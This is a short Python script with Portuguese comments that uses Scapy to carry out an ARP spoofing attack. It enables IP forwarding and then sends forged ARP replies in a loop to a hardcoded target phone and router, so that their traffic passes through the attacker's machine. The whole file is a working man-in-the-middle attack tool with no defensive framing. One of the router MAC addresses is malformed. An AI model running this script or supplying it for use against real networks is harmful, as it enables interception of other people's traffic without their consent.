from scapy.all import ARP, Ether, sendp, conf
import os


def enable_ip_forwarding():
    """
    Habilita o redirecionamento de pacotes no sistema.
    """
    os.system("sysctl -w net.inet.ip.forwarding=1")
    print("[INFO] IP Forwarding ativado.")


def arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac):
    """
    Realiza o ataque ARP Spoofing redirecionando o tráfego do alvo para o atacante.
    """
    # Cria os pacotes ARP Spoofing
    target_packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    router_packet = Ether(dst=spoof_mac) / ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)

    print(f"[INFO] Iniciando ARP spoofing: {target_ip} -> {spoof_ip} e {spoof_ip} -> {target_ip}")
    try:
        while True:
            sendp(target_packet, verbose=False)
            sendp(router_packet, verbose=False)
    except KeyboardInterrupt:
        print("\n[INFO] ARP spoofing interrompido.")


if __name__ == "__main__":
    # Habilita o IP forwarding
    enable_ip_forwarding()

    # Dados obtidos manualmente da tabela ARP
    target_ip = "10.0.0.101"  # IP do alvo (celular)
    target_mac = "5e:f2:c3:b2:b1:d5"  # MAC do alvo
    spoof_ip = "10.0.0.1"  # IP do roteador
    spoof_mac = "24:fd:d:2e:31:2f"  # MAC do roteador

    # Executa o ARP Spoofing
    arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac)
